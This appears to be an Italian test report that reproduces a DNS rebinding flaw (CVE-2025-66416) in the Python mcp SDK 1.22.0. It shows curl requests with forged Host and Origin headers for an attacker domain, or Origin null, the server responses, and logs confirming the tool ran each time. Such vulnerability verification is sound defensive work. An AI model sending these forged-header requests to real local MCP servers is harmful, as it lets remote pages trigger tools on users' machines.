# sdk_dns_rebinding, configurazione vulnerabile

Esecuzione del 2026-11-24 11:18:31 UTC. Completata.
Docker 29.9.3, Compose 5.7.0, commit git: 5f4e67a, nessuna modifica non salvata.

Protezione dal DNS rebinding nell'SDK Python mcp (CVE-2025-66416): versione 1.22.0 contro 1.23.0, con un server FastMCP su Streamable HTTP in ascolto su 127.0.0.1:8000. Le richieste arrivano dalla stessa macchina con gli header Host e Origin del dominio dell'attaccante, separati o insieme. Il tool chiamato crea un file con il nome del caso, e l'esito dipende dalla presenza di quel file.

**Casi conformi all'atteso: 6/6**

## Esiti

| Caso | Tipo | Esito | Atteso | Conforme |
|---|---|---|---|---|
| controllo_host_locale | controllo | accettata | accettata | sì |
| controllo_origin_locale | controllo | accettata | accettata | sì |
| host_esterno | attacco | accettata | accettata | sì |
| origin_esterna | attacco | accettata | accettata | sì |
| host_e_origin_esterni | attacco | accettata | accettata | sì |
| origin_null | limite | accettata | accettata | sì |

Conforme: l'esito osservato coincide con quello atteso per questa configurazione (con la versione vulnerabile, per i casi di attacco l'atteso è che riescano).

## Casi

### controllo_host_locale (controllo)

Client locale: Host 127.0.0.1:8000, nessuna Origin.

Output del client:

```
HTTP/1.1 200 OK
date: Tue, 24 Nov 2026 11:18:43 GMT
server: uvicorn
content-type: application/json
content-length: 185

{"jsonrpc":"2.0","id":1,"result":{"content":[{"type":"text","text":"eseguito: controllo_host_locale"}],"structuredContent":{"result":"eseguito: controllo_host_locale"},"isError":false}}
200
```

Stderr del client:

```
*   Trying 127.0.0.1:8000...
* Connected to 127.0.0.1 (127.0.0.1) port 8000
* using HTTP/1.x
> POST /mcp HTTP/1.1
> Host: 127.0.0.1:8000
> User-Agent: curl/8.11.1
> Content-Type: application/json
> Accept: application/json, text/event-stream
> Content-Length: 131
> 
} [131 bytes data]
* upload completely sent off: 131 bytes
< HTTP/1.1 200 OK
< date: Tue, 24 Nov 2026 11:18:43 GMT
< server: uvicorn
< content-type: application/json
< content-length: 185
< 
{ [185 bytes data]
* Connection #0 to host 127.0.0.1 left intact
```

Verifica sul container: `eseguito`

Esito: **accettata**, atteso: accettata

### controllo_origin_locale (controllo)

Origin http://localhost:8000 (pagina servita in locale).

Output del client:

```
HTTP/1.1 200 OK
date: Tue, 24 Nov 2026 11:18:44 GMT
server: uvicorn
content-type: application/json
content-length: 189

{"jsonrpc":"2.0","id":1,"result":{"content":[{"type":"text","text":"eseguito: controllo_origin_locale"}],"structuredContent":{"result":"eseguito: controllo_origin_locale"},"isError":false}}
200
```

Stderr del client:

```
*   Trying 127.0.0.1:8000...
* Connected to 127.0.0.1 (127.0.0.1) port 8000
* using HTTP/1.x
> POST /mcp HTTP/1.1
> Host: 127.0.0.1:8000
> User-Agent: curl/8.11.1
> Content-Type: application/json
> Accept: application/json, text/event-stream
> Origin: http://localhost:8000
> Content-Length: 133
> 
} [133 bytes data]
* upload completely sent off: 133 bytes
< HTTP/1.1 200 OK
< date: Tue, 24 Nov 2026 11:18:44 GMT
< server: uvicorn
< content-type: application/json
< content-length: 189
< 
{ [189 bytes data]
* Connection #0 to host 127.0.0.1 left intact
```

Verifica sul container: `eseguito`

Esito: **accettata**, atteso: accettata

### host_esterno (attacco)

Host del dominio dell'attaccante. Atteso con la 1.23.0: 421, tool non eseguito.

Output del client:

```
HTTP/1.1 200 OK
date: Tue, 24 Nov 2026 11:18:44 GMT
server: uvicorn
content-type: application/json
content-length: 167

{"jsonrpc":"2.0","id":1,"result":{"content":[{"type":"text","text":"eseguito: host_esterno"}],"structuredContent":{"result":"eseguito: host_esterno"},"isError":false}}
200
```

Stderr del client:

```
*   Trying 127.0.0.1:8000...
* Connected to 127.0.0.1 (127.0.0.1) port 8000
* using HTTP/1.x
> POST /mcp HTTP/1.1
> Host: attaccante.example:8000
> User-Agent: curl/8.11.1
> Content-Type: application/json
> Accept: application/json, text/event-stream
> Content-Length: 122
> 
} [122 bytes data]
* upload completely sent off: 122 bytes
< HTTP/1.1 200 OK
< date: Tue, 24 Nov 2026 11:18:44 GMT
< server: uvicorn
< content-type: application/json
< content-length: 167
< 
{ [167 bytes data]
* Connection #0 to host 127.0.0.1 left intact
```

Verifica sul container: `eseguito`

Esito: **accettata**, atteso: accettata

### origin_esterna (attacco)

Origin del dominio dell'attaccante. Atteso con la 1.23.0: 403, tool non eseguito.

Output del client:

```
HTTP/1.1 200 OK
date: Tue, 24 Nov 2026 11:18:45 GMT
server: uvicorn
content-type: application/json
content-length: 171

{"jsonrpc":"2.0","id":1,"result":{"content":[{"type":"text","text":"eseguito: origin_esterna"}],"structuredContent":{"result":"eseguito: origin_esterna"},"isError":false}}
200
```

Stderr del client:

```
*   Trying 127.0.0.1:8000...
* Connected to 127.0.0.1 (127.0.0.1) port 8000
* using HTTP/1.x
> POST /mcp HTTP/1.1
> Host: 127.0.0.1:8000
> User-Agent: curl/8.11.1
> Content-Type: application/json
> Accept: application/json, text/event-stream
> Origin: http://attaccante.example
> Content-Length: 124
> 
} [124 bytes data]
* upload completely sent off: 124 bytes
< HTTP/1.1 200 OK
< date: Tue, 24 Nov 2026 11:18:45 GMT
< server: uvicorn
< content-type: application/json
< content-length: 171
< 
{ [171 bytes data]
* Connection #0 to host 127.0.0.1 left intact
```

Verifica sul container: `eseguito`

Esito: **accettata**, atteso: accettata

### host_e_origin_esterni (attacco)

Host e Origin del dominio dell'attaccante insieme, come nella richiesta del browser dopo il rebinding. Atteso con la 1.23.0: 421 (l'Host è controllato per primo), tool non eseguito.

Output del client:

```
HTTP/1.1 200 OK
date: Tue, 24 Nov 2026 11:18:45 GMT
server: uvicorn
content-type: application/json
content-length: 185

{"jsonrpc":"2.0","id":1,"result":{"content":[{"type":"text","text":"eseguito: host_e_origin_esterni"}],"structuredContent":{"result":"eseguito: host_e_origin_esterni"},"isError":false}}
200
```

Stderr del client:

```
*   Trying 127.0.0.1:8000...
* Connected to 127.0.0.1 (127.0.0.1) port 8000
* using HTTP/1.x
> POST /mcp HTTP/1.1
> Host: attaccante.example:8000
> User-Agent: curl/8.11.1
> Content-Type: application/json
> Accept: application/json, text/event-stream
> Origin: http://attaccante.example:8000
> Content-Length: 131
> 
} [131 bytes data]
* upload completely sent off: 131 bytes
< HTTP/1.1 200 OK
< date: Tue, 24 Nov 2026 11:18:45 GMT
< server: uvicorn
< content-type: application/json
< content-length: 185
< 
{ [185 bytes data]
* Connection #0 to host 127.0.0.1 left intact
```

Verifica sul container: `eseguito`

Esito: **accettata**, atteso: accettata

### origin_null (limite)

Origin 'null' (iframe in sandbox, file locali), non tra quelle ammesse dalla 1.23.0.

Output del client:

```
HTTP/1.1 200 OK
date: Tue, 24 Nov 2026 11:18:46 GMT
server: uvicorn
content-type: application/json
content-length: 165

{"jsonrpc":"2.0","id":1,"result":{"content":[{"type":"text","text":"eseguito: origin_null"}],"structuredContent":{"result":"eseguito: origin_null"},"isError":false}}
200
```

Stderr del client:

```
*   Trying 127.0.0.1:8000...
* Connected to 127.0.0.1 (127.0.0.1) port 8000
* using HTTP/1.x
> POST /mcp HTTP/1.1
> Host: 127.0.0.1:8000
> User-Agent: curl/8.11.1
> Content-Type: application/json
> Accept: application/json, text/event-stream
> Origin: null
> Content-Length: 121
> 
} [121 bytes data]
* upload completely sent off: 121 bytes
< HTTP/1.1 200 OK
< date: Tue, 24 Nov 2026 11:18:46 GMT
< server: uvicorn
< content-type: application/json
< content-length: 165
< 
{ [165 bytes data]
* Connection #0 to host 127.0.0.1 left intact
```

Verifica sul container: `eseguito`

Esito: **accettata**, atteso: accettata

## Log del server

Estratto di `container.log`, con i traceback ridotti a una riga.

```
--- container usati per tutti i casi ---
target-1 11:18:38.792 /usr/local/lib/python3.12/site-packages/pydantic_settings/sources/utils.py:51: IncompleteFieldDefinitionWarning: Field 'lifespan' has an incomplete definition: its annotation contains an unresolved forward reference, so settings sources may fail to correctly resolve its value. Call `model_rebuild()`
target-1 11:18:38.792   warnings.warn(  # noqa: B028  (called from many sources at differing depths, so no stacklevel is correct)
target-1 11:18:38.795 mcp 1.22.0, protezione DNS rebinding attiva: False
target-1 11:18:38.812 INFO:     Started server process [1]
target-1 11:18:38.812 INFO:     Waiting for application startup.
target-1 11:18:38.812 StreamableHTTP session manager started
target-1 11:18:38.812 INFO:     Application startup complete.
target-1 11:18:38.812 INFO:     Uvicorn running on http://127.0.0.1:8000 (Press CTRL+C to quit)
cattura-1 11:18:40.965 tcpdump: listening on lo, link-type EN10MB (Ethernet), snapshot length 262144 bytes
target-1 11:18:44.563 Processing request of type CallToolRequest
target-1 11:18:44.563 tool eseguito per il caso controllo_host_locale
target-1 11:18:44.565 INFO:     127.0.0.1:43752 - "POST /mcp HTTP/1.1" 200 OK
target-1 11:18:44.565 Terminating session: None
target-1 11:18:44.566 Error in message router
target-1 11:18:44.566 [traceback omesso, termina con: anyio.ClosedResourceError]
target-1 11:18:45.134 Processing request of type CallToolRequest
target-1 11:18:45.134 tool eseguito per il caso controllo_origin_locale
target-1 11:18:45.134 INFO:     127.0.0.1:43754 - "POST /mcp HTTP/1.1" 200 OK
target-1 11:18:45.135 Terminating session: None
target-1 11:18:45.135 Error in message router
target-1 11:18:45.135 [traceback omesso, termina con: anyio.ClosedResourceError]
target-1 11:18:45.695 Processing request of type CallToolRequest
target-1 11:18:45.695 tool eseguito per il caso host_esterno
target-1 11:18:45.696 INFO:     127.0.0.1:43770 - "POST /mcp HTTP/1.1" 200 OK
target-1 11:18:45.696 Terminating session: None
target-1 11:18:45.696 Error in message router
target-1 11:18:45.696 [traceback omesso, termina con: anyio.ClosedResourceError]
target-1 11:18:46.218 Processing request of type CallToolRequest
target-1 11:18:46.218 tool eseguito per il caso origin_esterna
target-1 11:18:46.219 INFO:     127.0.0.1:43774 - "POST /mcp HTTP/1.1" 200 OK
target-1 11:18:46.219 Terminating session: None
target-1 11:18:46.219 Error in message router
target-1 11:18:46.219 [traceback omesso, termina con: anyio.ClosedResourceError]
target-1 11:18:46.764 Processing request of type CallToolRequest
target-1 11:18:46.764 tool eseguito per il caso host_e_origin_esterni
target-1 11:18:46.765 INFO:     127.0.0.1:43790 - "POST /mcp HTTP/1.1" 200 OK
target-1 11:18:46.765 Terminating session: None
target-1 11:18:46.765 Error in message router
target-1 11:18:46.765 [traceback omesso, termina con: anyio.ClosedResourceError]
target-1 11:18:47.320 Processing request of type CallToolRequest
target-1 11:18:47.320 tool eseguito per il caso origin_null
target-1 11:18:47.321 INFO:     127.0.0.1:43806 - "POST /mcp HTTP/1.1" 200 OK
target-1 11:18:47.321 Terminating session: None
target-1 11:18:47.321 Error in message router
target-1 11:18:47.321 [traceback omesso, termina con: anyio.ClosedResourceError]
cattura-1 11:18:47.979 90 packets captured
cattura-1 11:18:47.979 180 packets received by filter
cattura-1 11:18:47.979 0 packets dropped by kernel
target-1 11:18:48.138 INFO:     Shutting down
target-1 11:18:48.251 INFO:     Waiting for application shutdown.
target-1 11:18:48.251 StreamableHTTP session manager shutting down
target-1 11:18:48.251 INFO:     Application shutdown complete.
target-1 11:18:48.251 INFO:     Finished server process [1]
```

## Altri file di questa cartella

- `container.log`: log dei container con timestamp, una sezione per avvio
- `pcap/`: traffico di rete del servizio sotto test (Wireshark), vuoto se il server usa stdio
- `risultati.jsonl`: output completo di ogni caso e ripetizione, per i programmi
- `meta.json`, `immagini.json`, `immagini_base.json`, `pacchetti.txt`, `comandi.log`, `scenario/`: versioni, digest, comandi e file usati
